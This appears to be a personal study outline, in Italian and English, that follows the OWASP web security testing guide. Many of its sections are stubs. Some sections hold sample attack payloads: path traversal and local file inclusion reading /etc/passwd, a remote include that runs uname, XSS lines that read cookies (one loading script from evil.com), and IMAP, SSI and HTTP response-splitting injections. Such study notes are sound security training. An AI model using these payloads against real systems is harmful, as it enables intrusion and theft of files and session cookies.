
|##########################################################################
|##########################################################################
|              INFORMATION DISCLOSURE
|##########################################################################
|##########################################################################


|##########################################################################
Conduct search engine discovery/reconnaissance
for information leakage (OTG-INFO-001) (30) 
##########################################################################
	google dork 
		site:
			cerca {
			Footholds
			Files containing usernames
			Sensitive Directories
			Web Server Detection
			Vulnerable Files
			Vulnerable Servers
			Error Messages
			Files containing juicy info
			Files containing passwords
			Sensitive Online Shopping Info
			}
	
	
	}
	
##########################################################################
	Fingerprint Web Server (OTG-INFO-002)  
##########################################################################
			
	}
		
	Review Webserver Metafiles for Information

##########################################################################
Leakage (OTG-INFO-003) (34) 
##########################################################################
		robots.txt
	
##########################################################################
	Enumerate Applications on Webserver
(OTG-INFO-004) (36) 
##########################################################################

	Review webpage comments and metadata
for information leakage (OTG-INFO-005) (39) {
	Commenti http <!--
	metadata 
	
	
}

##########################################################################
	Identify application entry points (OTG-INFO-006) (40) 
##########################################################################
			Stylesheet

##########################################################################
	Map execution paths through application
(OTG-INFO-007) (42) 
##########################################################################
			Stylesheet


##########################################################################
	Fingerprint Web Application Framework
(OTG-INFO-008) (43) 
##########################################################################

	Header
		powered
	cookies
	source code
	files e cartelle specifiche 
	Tools {
		Whatweb
		BlindElephant
		
	
	
	}
}

##########################################################################
	Fingerprint Web Application (OTG-INFO-009) (46) 
##########################################################################
		metadata
		file particolari


##########################################################################
	Map Application Architecture (OTG-INFO-010) (49) 
##########################################################################
		Conoscenza data ai pentest
			Firewall, reverse proxy 

	
##########################################################################
	Test Network/Infrastructure Configuration
(OTG-CONFIG-001) (50) 
##########################################################################




##########################################################################
	Test Application Platform Configuration
(OTG-CONFIG-002)  (52) 
##########################################################################

	File e directories di esempio
	Commenti html
	Informazioni sensibili nei log {
		• Debug information
		• Stack traces
		• Usernames
		• System component names
		• Internal IP addresses
		• Less sensitive personal data (e.g. email addresses, postal addresses
		and telephone numbers associated with named individuals)
		• Business data
		• Application source code
		• Session identification values
		• Access tokens
		• Sensitive personal data and some forms of personally identifiable
		information (PII)
		• Authentication passwords
		• Database connection strings
		• Encryption keys
		• Bank account or payment card holder data
		• Data of a higher security classification than the logging system is
		allowed to store
		• Commercially-sensitive information
		• Information it is illegal to collect in the relevant jurisdiction
		• Information a user has opted out of collection, or not consented to
		e.g. use of do not track, or where consent to collect has expired
	}
	Locazione dei log 
	Rischi di DOS 
		log in partizioni specifiche
}


##########################################################################
	Test File Extensions Handling for Sensitive
Information (55)     (OTG-CONFIG-003)
##########################################################################
		Nessus e Nikto
	
##########################################################################
	Review Old, Backup and Unreferenced Files for
Sensitive Information (OTG-CONFIG-004) (56)  
##########################################################################

		Come testare {
                      WayBackArchive
			Inferenza (adduser -> edituser ... )
			link in commenti
			Vulnerabilità in web servers
			identifica estensioni dell'applicazioni e fai spidering
				trovi risorse e poi cambi in old, bkp, ...
		}
		
	}
	

##########################################################################
	Enumerate Infrastructure and Application Admin
Interfaces (OTG-CONFIG-005) (59) 
##########################################################################
	
}
	Test HTTP Methods (OTG-CONFIG-006) (60) {
		Da disabilitare 
				PUT: This method allows a client to upload new files on the web
					server. An attacker can exploit it by uploading malicious files (e.g.: an
					asp file that executes commands by invoking cmd.exe), or by simply
					using the victim’s server as a file repository.
				• DELETE: This method allows a client to delete a file on the web
					server. An attacker can exploit it as a very simple and direct way to
					deface a web site or to mount a DoS attack.
				• CONNECT: This method could allow a client to use the web server
					as a proxy.
				• TRACE: This method simply echoes back to the client whatever
					string has been sent to the server, and is used mainly for debugging
					purposes. This method, originally assumed harmless, can be used to
					mount an attack known as Cross Site Tracing, which has been discovered
					by Jeremiah Grossman (see links at the bottom of the page).
	}
	
	Metodi arbitrari
		Bypass
	Metodo HEAD
		Trova un redirect
			verifica che con head non redirect 
				Prova CSRF
		
	nc 
	
	}
##########################################################################
	Test HTTP Strict Transport Security
(OTG-CONFIG-007) (62) 
##########################################################################
	curl -s -D- https://domain.com/ | grep Strict
        Ricorsivo?
}


##########################################################################
	test ria cross domain policy (otg-config-008) (63) 
##########################################################################
tbd
##########################################################################

##########################################################################
    TEST FILE PERMISSIONS (OTG-CONFIG-009)
##########################################################################
  namei (LOCALE)
##########################################################################


##########################################################################
        Fingerprint Web Application (OTG-INFO-009)
##########################################################################
  Analizza Cookie
  Meta codice sorgente
  Particolari cartelle
  BlindElephant.py
  Wappalizer
##########################################################################


##########################################################################
       Map Application Architecture (OTG-INFO-010)
##########################################################################
TBD
##########################################################################



|##########################################################################
|##########################################################################
|              IDENTIFICATION
|##########################################################################
|##########################################################################

##########################################################################
	Test Role Definitions (OTG-IDENT-001) (64) 
##########################################################################
		Principio di Goldilock
		Identifica ruoli
			Matrice Ruoli / permessi
		Test User Registration Process
##########################################################################

##########################################################################
(OTG-IDENT-002) (64)  Validazione con requisiti
##########################################################################
		
		Testing for Account Enumeration and Guessable




##########################################################################
	User Account (OTG-IDENT-004) (65) 
##########################################################################
		Enumeration 
			Usa proxy 
				differenze pagine
				urls diverse?
				error codes?
				uri probing
				analizza titoli web pages
				
					valido user password erata / user sbagliato password sbagliato
			Guessing Users
				Prevedibili
	}



##########################################################################
	Testing for Weak or unenforced username policy
(OTG-IDENT-005) (68) 
##########################################################################

##########################################################################




##########################################################################
Testing for Credentials Transported over
an Encrypted Channel (OTG-AUTHN-001) (68)
##########################################################################
		
		login via http
		Da Referer HTTP a login 
			SSL Strip Attacks
		Invia dati via GET al posto di POST
##########################################################################

|##########################################################################
|##########################################################################
|              AUTHORIZATION
|##########################################################################
|##########################################################################

##########################################################################
	Testing for Privilege escalation
(OTG-AUTHZ-003) (85) 
##########################################################################
		Dalla matrice 
			Identifica funzioni e cosa non è autorizzato a fare un ruolo minore
				Verifica se può farlo in qualche modo
				A shouldn't do this ... 
					Test: 
					
			

	
Session Managment Testing (87)  
##########################################################################
	Session Managment Schema 
	Testing for cookies attributes (OTG-SESS-002) 
##########################################################################
		secure
		httponly
		domain attributes
		path attributes
	}
	
	
	
##########################################################################
	Testing for Session Fixation (OTG-SESS-003)  
##########################################################################
		Prima di auth != dopo auth
		
	}
##########################################################################
	Testing for logout functionality (OTG-SESS-006) (98) {
##########################################################################
	}
		
|##########################################################################
|##########################################################################
|              AUTHORIZATION
|##########################################################################
|##########################################################################

##########################################################################
              Testing Directory traversal/file include (OTG-AUTHZ-001)
##########################################################################
  Applicazione usa script server side per includere vari tipi di files
  2 step
    Input vector enumeration
      Enumera tutte le parti inviate dall'utente
        Request parameters per operazioni correlate con file?
        Estensioni file inusuali?
        Nomi variabili interessanti?
      Cookie usati per la generazione dinamica di pagine e template?


    Testing Techniques
      http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
      Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
      Inclusione:  
        http://example.com/index.php?file=http://www.owasp.org/malicioustxt
        http://example.com/index.php?file=file:///etc/passwd 
      Sonda servizi interni
        http://example.com/index.php?file=http://localhost:8080 or http://example.com/index.php?file=http://192.168.0.2:9080
      Codice sorgente
        http://example.com/main.cgi?home=main.cgi 
      VD


##########################################################################
  Testing for Bypassing Authorization Schema (OTG-AUTHZ-002)
##########################################################################
  Per ogni azione post authentication verifica:
    Azione non autenticata?    
    Accesso a risorsa dopo logout?
    Accesso a funzioni a un utente che mantiene differente ruolo / privilegio?

    Amministratore
      Accesso con privilegio minore?
      

##########################################################################
Testing for Privilege escalation (OTG-AUTHZ-003)
##########################################################################
  Registra azioni:
    Crea in database
    Ricevi informazioni
    Cancella informazioni
      Verifica se utente A può fare azioni dell'utente B
        Manipolazione Profilo Utente
    Manpipolazione condition value
      La risposta da negazione -> modifica risposta
    Manipola indirizzo IP
    URL Traversal


  WHITEBOX
    startswith(), endswith(), contains(), indexOf()

##########################################################################
Testing for Insecure Direct Object References (OTG-AUTHZ-004)
##########################################################################





|##########################################################################
|##########################################################################
|              INPUT VALIDATION
|##########################################################################
|##########################################################################



##########################################################################
	Testing for Reflected Cross Site Scripting (OTG-INPVAL-001) (100)
##########################################################################
    Fasi
      Rileva input vectors
      Analizza per rilevare vulnerabilità 
        <script>alert(123)</script>
        “><script>alert(document.cookie)</script>
    -Tecniche bypass filtri
        Parameter pollution
	
##########################################################################
	Testing for Stored Cross site scripting
(OTG-INPVAL-002) (104) 
##########################################################################
  Zone:
    User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.
    Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later
    File Manager: application that allows upload of files
    Application settings/preferences: application that allows the user to set preferences
    Forum/Message board: application that permits exchange of posts among users
    Blog: if the blog application permits to users submitting comments
    Log: if the application stores some users input into logs. 
  
  Tool da usare:
     BeEF, XSS Proxy and Backframe
  File Upload
    Caricare HTML
    browser MIME mishandling attack

##########################################################################
      Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003)
##########################################################################
    Metodi DAV -> script automatico


##########################################################################
      Testing for HTTP Parameter pollution (OTG-INPVAL-004)
##########################################################################
    Bypass filtri input validation
    Authentication bypass

    Test
      Manda var1=par1
          var1=TEST_HPP
         var1=par1&var1=TEST_HPP
        req 3 != req1 e req2 ? Indaga su potenziali hpp
        
##########################################################################
VTesting for SQL Injection (OTG-INPVAL-005)
##########################################################################
  Individua interazioni con DB
    Form autenticazione
    Motori di ricerca
    Siti e-commerce

    Testbase
      ' ;
        Errore?

    Fingerprinting
      Messaggio errore
      Concatenation
        MySql: ‘test’ + ‘ing’
        SQL Server: ‘test’ ‘ing’
        Oracle: ‘test’||’ing’
        PostgreSQL: ‘test’||’ing’
        
##########################################################################
	testing for xml injection (otg-inpval-008) (135){}
##########################################################################
  Step1: Discovery
    metacaratteri XML: ', ", <>, <!--/-->, &, <![CDATA[ / ]]>
    CDATA eliminazione
      -> xss
    XXE: nuove entità
  Step2: TAG INjection
	
##########################################################################
            Testing for SSI Injection (OTG-INPVAL-009)
##########################################################################
Alternativa a CGI
VErificare SO con info gathering
Steps
  Test base: shtml ma non basta
  2: Inietta
    < ! # = / . " - > and [a-zA-Z0-9]
    <!--#include virtual="/etc/passwd" -->


##########################################################################
Testing for XPath Injection (OTG-INPVAL-010)
##########################################################################
Come SQL

##########################################################################
    Testing for IMAP/SMTP Injection (OTG-INPVAL-011)
##########################################################################
Descrizione
  Mail applications
  Iniettare comandi IMAP/SMPT
  Inietta direttamente in BE bypassando application
Steps
  1. Identifica parametri vulnerabili
    mbox: rimuovi valore, random value, add values, caratteri speciali
    Risultati:  
      S1: ritorna errore  (Injection)
      S2: non ritorna errore ma non processa  (Blind injection)
      S3: realizza
  2. Comprendi dataflow 
    Identifica funzionalità
  3. Exploit
    http://<webmail>/read_email.php?message_id=4791
    FETCH 4791 BODY[HEADER]
    http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791
##########################################################################
      Testing for Code Injection (OTG-INPVAL-012)
##########################################################################
Sfrutta pagine incluse
http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a

##########################################################################
  Testing for Local File Inclusion
##########################################################################
Descrizione
  Includi files già presenti
Quando accade
  Pagina riceve input a file da includere
Test
  http://vulnerable_host/preview.php?file=example.html
  http://vulnerable_host/preview.php?file=../../../../etc/passwd
  Bypassa controlli 
    http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
    http://vulnerable_host/preview.php?file=../../../../etc/passwd%00jpg



##########################################################################
        Testing for Remote File Inclusion
##########################################################################


##########################################################################
Testing for Command Injection (OTG-INPVAL-013)
##########################################################################
Utente fornisce comandi via interfaccia e si relazione con OS
Come testarlo
  PHP
  Perl
    commix 
  
##########################################################################
          Attacchi a buffer overflow
##########################################################################
  
##########################################################################
4.8.15 Testing for incubated vulnerabilities (OTG-INPVAL-015)
##########################################################################



##########################################################################
4.8.16 Testing for HTTP Splitting/Smuggling (OTG-INPVAL-016)
##########################################################################

Splitting
  Non controllo parametri %0d%0a
  Candidati:
    Location
    Set-Cookie

  %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-
  Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>

  Dettagli
    se filtra <> usa UTF-7

GrayBox
  TBD  



##########################################################################
4.8.17 Testing for HTTP Incoming Requests (OTG-INPVAL-017)
##########################################################################


|##########################################################################
|##########################################################################
|              BUSINESS LOGIC TESTING
|##########################################################################
|##########################################################################

|##########################################################################
4.11.1 Test Business Logic Data Validation (OTG-BUSLOGIC-001)
|##########################################################################
Verifica sintattica non basta
  Es SSN : persona morta o altro paese
Testing
  Analizza DOCUMENTAZIONE e verifica entrypoint e valida
  Test funzionali su entry point
  Punti costi / qualità passati
    manomissione
  SSN non validi / manomissioni 



|##########################################################################
4.11.2 Test Ability to Forge Requests (OTG-BUSLOGIC-002)
|##########################################################################
Bypassare eventi
Easter eggs
Esempi
  hidden lato client nascosti sconti
  
Testare
  Leggi DOCUMENTAZIONE, cerca prevedibili funzionalità / campi
  Bypassa normale flusso applicazione


  Specifiche tecniche
    Variabili che si incrementano automaticamente
    Campi hidden
      DEBUG, special features
    
|##########################################################################
4.11.3 Test Integrity Checks (OTG-BUSLOGIC-003)
|##########################################################################
Campi nascosti, controlli solo client

Test specifici
  Proxy
    hidden fields
    inserisci info in aree non editabili
    log / database

|##########################################################################
4.11.4 Test for Process Timing (OTG-BUSLOGIC-004)
|##########################################################################
Bypass logica attendendo tempo giusto
  Analisi timing per login
  Richiesta riservata (posto teatro) ma sospesa
    starvation?
Tersting
  Documentazione
    Analizza elementi time-dependent
|##########################################################################
4.11.5 Test Number of Times a Function Can be Used Limits (OTG-BUSLOGIC-005)
|##########################################################################

|##########################################################################
4.11.6 Testing for the Circumvention of Work Flows (OTG-BUSLOGIC-006)
|##########################################################################
  Analizza sequenze in Documentazione
    Cambia sequenze in flussi non accettabili
  Testing Method 1
    Avvia transazione che dona punti
    Cancella la transazione o riduci il prezzo finale cosi valore decrementato e controlla credito per assicurarti che giusto credit è registrato
  
  Testing Method 2
    Bypassa controlli in EDIT in board bullettin

|##########################################################################
4.11.7 Test Defenses Against Application Mis-use (OTG-BUSLOGIC-007)
|##########################################################################
  GET -> POST
  ID non permesso
  ' al posto di ID
  Aggiungi parametri extra
  Duplica coppia nome/valore


Come testare
  Risposte Cambiate
  Richieste Bloccate
  Azioni log out o bloccare il loro account

Localized security controls are not sufficient. There are often no defenses against general mis-use such as:
  - Forced browsing
  - Bypassing presentation layer input validation
  - Multiple access control errors
  - Additional, duplicated or missing parameter names
  - Multiple input validation or business logic verification failures with values that cannot be the result user mistakes or typos
  - Structured data (e.g. JSPN, XML) of an invalid format is received
  - Blatant cross-site scripting or SQL injection payloads are received
  - Utilising the application faster than would be possible without automation tools
  - Change in continental geo-location of a user
  - Change of user agent
  - Accessing a multi-stage business process in the wrong order
  - Large number of, or high rate of use of, application-specific functionality (e.g. voucher code submission, failed credit card payments, file uploads, file downloads, log outs, etc).



|##########################################################################
4.11.8 Test Upload of Unexpected File Types (OTG-BUSLOGIC-008)
|##########################################################################


Generic Testing Method
• Review the project documentation and perform some exploratory testing looking for file types that should be "unsupported" by the application/system.
• Try to upload these “unsupported” files an verify that it are properly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.

Specific Testing Method
• Study the applications logical requirements.
• Prepare a library of files that are “not approved” for upload that may contain files such as: jsp, exe, or html files containing script.
• In the application navigate to the file submission or upload mechanism.
• Submit the “not approved” file for upload and verify that they are properly prevented from uploading
• Check if the website only do file type check in client side JavaScript
• Check if the website only check the file type by "Content-Type" in HTTP request.
• Check if the website only check by the file extension.
• Check if other uploaded files can be accessed directly by specified URL.
• Check if the uploaded file can include code or script injection.
• Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified path in ZIP so that the unzip files can be uploaded to intended path after uploading and unzip.

|##########################################################################
4.11.9 Test Upload of Malicious Files (OTG-BUSLOGIC-009)
|##########################################################################
ZIP Bomb
ZIP Files

|##########################################################################
|              CLIENT SIDE TESTING
|##########################################################################
|##########################################################################



##########################################################################
4.12.1 Testing for DOM based Cross Site Scripting (OTG-CLIENT-001)
##########################################################################
document.write
  WHITE-BOX client-side
##########################################################################
4.12.2 Testing for JavaScript Execution (OTG-CLIENT-002)
##########################################################################
TBD

##########################################################################
4.12.3 Testing for HTML Injection (OTG-CLIENT-003)
##########################################################################



##########################################################################
4.12.4 Testing for Client Side URL Redirect (OTG-CLIENT-004)
##########################################################################
  Applicazione accetta input non voluto
  Come
    GRAYBOX (codice lato client disponibile)





##########################################################################
4.12.5 Testing for CSS Injection (OTG-CLIENT-005)
##########################################################################
TBD
##########################################################################
4.12.6 Testing for Client Side Resource Manipulation (OTG-CLIENT-006)
##########################################################################
www.victim.com/#http://evil.com/js.js
  alert(document.cookie)
Analizza
  Frame  iframe  src
  Link  a href
  AJAX Request  xhr.open(method, [url], true);  URL
  CSS link  href
  Image img src
  Object  object  data
  Script  script  src






##########################################################################
4.12.7 Test Cross Origin Resource Sharing (OTG-CLIENT-007)
##########################################################################
CORS:
  
##########################################################################
4.12.8 Testing for Cross Site Flashing (OTG-CLIENT-008)
##########################################################################
TBD
##########################################################################
4.12.9 Testing for Clickjacking (OTG-CLIENT-009)
##########################################################################
Utente interagisce con qualcosa diverso da ciò che crede
Test:
  verifica se possiamo caricarla dentro un iframe
Protezioni
  Lato client: Frame Bursting
  Server side protection: X-Frame-Options



##########################################################################
4.12.10 Testing WebSockets (OTG-CLIENT-010)
##########################################################################
TBD
##########################################################################
4.12.11 Test Web Messaging (OTG-CLIENT-011)
##########################################################################
TBD
##########################################################################
4.12.12 Test Local Storage (OTG-CLIENT-012)
##########################################################################
TBD
##########################################################################
